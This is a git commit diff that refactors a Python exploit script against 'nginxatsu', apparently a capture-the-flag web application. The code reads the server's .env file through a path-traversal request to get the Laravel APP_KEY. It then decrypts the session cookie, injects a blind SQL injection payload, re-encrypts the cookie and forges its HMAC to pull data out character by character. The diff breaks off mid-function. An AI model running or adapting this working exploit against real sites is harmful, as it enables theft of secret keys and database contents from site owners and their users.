b3b8a879da742df8db7ff846ded4f591d10efd40
d4rkstat1c <44454186+d4rk007@users.noreply.github.com>
2021-05-01 18:03:07 +0000

    Update nginxatsu.py

--- nginxatsu/nginxatsu.py
+++ nginxatsu/nginxatsu.py
@@ -19,17 +19,10 @@ from time import sleep
 BASE_URL = 'http://<nginxatsu_ip>:<port>/'
 MAX_THRDS = 15
 
-def get_key(session):
-	session.get(BASE_URL)
-	env_data = session.get(BASE_URL+'assets../.env').text
-	key_pattern = 'APP_KEY=base64:'
-	app_key_start = env_data.find(key_pattern)+len(key_pattern)
-	key_str = env_data[app_key_start:app_key_start+44]
-	return b64decode(key_str)
-
 class Aes:
 	def __init__(self, key):
 		self.key = key
+		self.iv = None
 
 	def encrypt(self, pt, iv):
 		cipher = AES.new(self.key, AES.MODE_CBC, iv)
@@ -42,8 +35,19 @@ class Aes:
 class cookie_bsqli:
 	def __init__(self):
 		self.session = requests.session()
-		self.aes = Aes(get_key(self.session))
+		self.aes = Aes(self.__get_key(self.session))
+		self.cookie_dict, self.cookie_id = self.__decode_cookie()
+		self.deserialized_data = self.__decrypt_value()
 		self.exfil_data = {}
+
+	@staticmethod
+	def __get_key(session):
+		session.get(BASE_URL)
+		env_data = session.get(BASE_URL+'assets../.env').text
+		key_pattern = 'APP_KEY=base64:'
+		app_key_start = env_data.find(key_pattern)+len(key_pattern)
+		key_str = env_data[app_key_start:app_key_start+44]
+		return b64decode(key_str)
 
 	@staticmethod
 	def __get_cookie(cookies, cookie_str):
@@ -51,7 +55,7 @@ class cookie_bsqli:
 			if cookie_str not in cookie:
 				return cookie
 
-	def __send_payload(self, payload_fstr, pos, ch):
+	def __decode_cookie(self):
 		"""
 		First extract target cookie ID/name and corresponding values and parse the json data of the target cookie
 		"""
@@ -59,59 +63,64 @@ class cookie_bsqli:
 		cookie_id, encoded_data = self.__get_cookie(cookies, 'nginxatsu_session')
 		cookie_json = b64decode(parse.unquote(encoded_data))
 		cookie_dict = json.loads(cookie_json)
+		return cookie_dict, cookie_id
 
+	def __decrypt_value(self):
 		"""
 		Next we decode the target cookie's json "value" and "iv" base64 encoded strings
 		"""
-		encrypted_val = b64decode(cookie_dict['value'])
-		iv = b64decode(cookie_dict['iv'])
+		encrypted_val = b64decode(self.cookie_dict['value'])
+		self.aes.iv = b64decode(self.cookie_dict['iv'])
 
 		"""
 		Next we decrypt the encrypted "value" raw bytes and parse the json "value" data into a dictionary
 		"""
-		json_val = self.aes.decrypt(encrypted_val, iv)
+		json_val = self.aes.decrypt(encrypted_val, self.aes.iv)
 		value_data = json.loads(json_val)
+
+		return phpserialize.loads(value_data['data'].encode())
+
+	def __send_payload(self, payload_fstr, pos, ch):
 
 		"""
 		Now we extract the 'data' php serialize()'d string from the decrypted json "value" data
 		"""
-		deserialized_data = phpserialize.loads(value_data['data'].encode())
 
 		"""
 		We now have the target cookie data that we can inject with our constructed BLIND-SQLI payload
 		"""
 		payload = payload_fstr.format(pos=pos, ch=ch)
-		deserialized_data[b'order'] = payload
+		self.deserialized_data[b'order'] = payload
 		
 		"""
 		Next we re-serialized the cookie containing the payload and user and json encode it with the correct separators
 		"""
-		serialized_data = phpserialize.dumps(deserialized_data)
+		serialized_data = phpserialize.dumps(self.deserialized_data)
 		new_data = {'data':serialized_data.decode(), 'expires':int(time.time()+60*60)}
 		json_nval = json.dumps(new_data).encode()
 
 		"""
 		Encrypt the injected data object contained in the target cookie
 		"""
-		encrypted_nval = self.aes.encrypt(json_nval, iv)
+		encrypted_nval = self.aes.encrypt(json_nval, self.aes.iv)
 		b64_encrypted_nval = b64encode(encrypted_nval).decode()
 
 		"""
 		Modify the original cookie_dict extracted from the first step to contain the injected value payload and newly generated hmac
 		"""
-		cookie_dict['value'] = b64_encrypted_nval
-		cookie_dict['mac'] = hmac.new(self.aes.key, (cookie_dict['iv']+cookie_dict['value']).encode(), hashlib.sha256).hexdigest()
+		self.cookie_dict['value'] = b64_encrypted_nval
+		self.cookie_dict['mac'] = hmac.new(self.aes.key, (self.cookie_dict['iv']+self.cookie_dict['value']).encode(), hashlib.sha256).hexdigest()
 
 		"""
 		Convert cookie_dict to json then base64 and url encode it
 		"""
-		cookie_payload = json.dumps(cookie_dict).encode()
+		cookie_payload = json.dumps(self.cookie_dict).encode()
 		b64_cookie_payload = b64encode(cookie_payload).decode()
 
 		"""
 		Now set the current session cookie's to our injected cookie + nginxatsu_session
 		"""
-		self.session.cookies.set(cookie_id, b64_cookie_payload, domain=re.split("//|:", BASE_URL)[2])
+		self.session.cookies.set(self.cookie_id, b64_cookie_payload, domain=re.split("//|:", BASE_URL)[2])
 		r = self.session.get(BASE_URL+'api/configs/')
 		if r.status_code == 200 and ch:
 			if type(ch) == int:
